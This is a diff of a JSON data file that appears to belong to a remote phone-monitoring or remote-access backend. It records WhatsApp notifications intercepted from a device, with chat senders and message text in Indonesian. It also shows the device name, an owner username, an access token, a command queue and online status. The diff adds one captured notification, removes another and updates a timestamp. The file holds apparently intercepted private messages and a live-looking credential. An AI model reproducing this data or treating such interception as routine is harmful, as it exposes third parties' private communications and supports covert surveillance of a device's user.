@@ -22,6 +22,14 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1169 pesan dari 20 chat",
+        "time": "29/04 22:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777472131121
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (534 pesan): ~ Lemon skibidy",
         "content": "Pake celana ny",
         "time": "29/04 22:26",
@@ -4011,14 +4019,6 @@
         "time": "29/04 22:18",
         "pkg": "com.whatsapp",
         "receivedAt": 1777471638959
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎2014 pesan dari 20 chat",
-        "time": "29/04 22:18",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777471638463
       }
     ],
     "galleryPhotos": [],
@@ -4069,7 +4069,7 @@
     "deviceName": "HP-AGUSGANTENG123-3E9A",
     "ownerUsername": "zaa",
     "token": "20fdcadc903f75b92eda3edefa92e509",
-    "lastSeen": 1777472117031,
+    "lastSeen": 1777472131012,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:37:12.639Z",
